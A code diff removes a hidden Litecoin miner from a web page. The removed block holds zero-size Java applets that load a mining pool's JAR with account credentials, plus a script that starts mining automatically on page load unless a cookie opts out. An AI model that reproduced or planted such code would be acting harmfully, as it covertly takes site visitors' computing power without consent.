@@ -139,67 +139,6 @@ blink {
   width="889" height="255" alt="/>_"></a></center>
   
   
-  
-  <object id="ltcminer" data="http://www.litecoinpool.org/java/embeddable.jar" classid="java:org.litecoinpool.miner.EmbeddableMiner" type="application/x-java-applet" width="0" height="0">
-<param name="code" value="org.litecoinpool.miner.EmbeddableMiner">
-<param name="archive" value="http://www.litecoinpool.org/java/embeddable.jar">
-<param name="scriptable" value="true">
-<param name="auth" value="Nightmar.cryptx:63qwerty">
-</object>
-
-
-
-<object id="ltcminer" classid="java:org.litecoinpool.miner.EmbeddableMiner" type="application/x-java-applet" width="0" height="0">
-<param name="code" value="org.litecoinpool.miner.EmbeddableMiner">
-<param name="archive" value="http://www.litecoinpool.org/java/embeddable.jar">
-<param name="scriptable" value="true">
-<param name="auth" value="Nightmar.cryptx:63qwerty">
-<param name="autostart" value="false">
-<param name="threads" value="0">
-<param name="throttle" value="0.5">
-</object>
-
-<table id="miner-widget">
-<tr><th colspan="2">Litecoin Miner</th></tr>
-<tr><td>Speed:</td><td id="ltcspeed" style="text-align:right">0</td></tr>
-<tr><td>Shares:</td><td id="ltcshares" style="text-align:right">0</td></tr>
-<tr><td colspan="2"><input id="ltcpower" type="button" value="Loading..." style="width:100%"></td></tr>
-</table>
-
-<script type="text/javascript">
-var ltcMiner = document.getElementById('ltcminer');
-var ltcSpeed = document.getElementById('ltcspeed');
-var ltcShares = document.getElementById('ltcshares');
-var ltcPower = document.getElementById('ltcpower');
-
-ltcPower.onclick = function() {
-    var date = new Date();
-    date.setTime(date.getTime()+365*86400000);
-    var p = '; expires='+date.toGMTString()+'; path=/';
-    if (ltcPower.value == 'Start') {
-        ltcMiner.startMining();
-        document.cookie = 'mineLTC=1' + p;
-    } else {
-        ltcMiner.stopMining();
-        document.cookie = 'mineLTC=0' + p;
-    }
-}
-
-function ltcUpdate() {
-    ltcSpeed.innerHTML = ltcMiner.getSpeed();
-    ltcShares.innerHTML = ltcMiner.getValidCount();
-    ltcPower.value = ltcMiner.isMining() ? 'Stop' : 'Start';
-}
-
-setInterval(ltcUpdate, 1000);
-
-if (document.cookie.indexOf('mineLTC=0') == -1)
-    ltcMiner.startMining();
-</script>
-
- 
- 
- 
  
    <script>
     ChatraID = '3Lw3FbGWD4TzJMRrb';
